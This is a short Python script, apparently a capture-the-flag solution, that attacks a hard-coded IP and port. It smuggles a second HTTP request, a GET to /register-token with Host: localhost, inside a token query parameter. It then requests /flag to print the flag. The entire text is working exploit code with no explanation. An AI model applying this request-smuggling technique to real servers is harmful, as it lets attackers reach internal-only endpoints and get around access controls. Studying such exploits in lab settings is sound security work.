import requests

URL = 'http://64.227.131.98:40001'
TOKEN = "KINZX203"

payload = f'''
{TOKEN}
Content-Length: 0
Connection: keep-alive

GET /register-token?token={TOKEN} HTTP/1.1
Host: localhost
'''.strip()  # Remove extra whitespace

# Register token by smuggling second request
resp = requests.get(f"{URL}/flag", params={'token': payload})
# print(resp.json())

# Profit
resp = requests.get(f"{URL}/flag", params={'token': TOKEN})
print(resp.json()['body'])
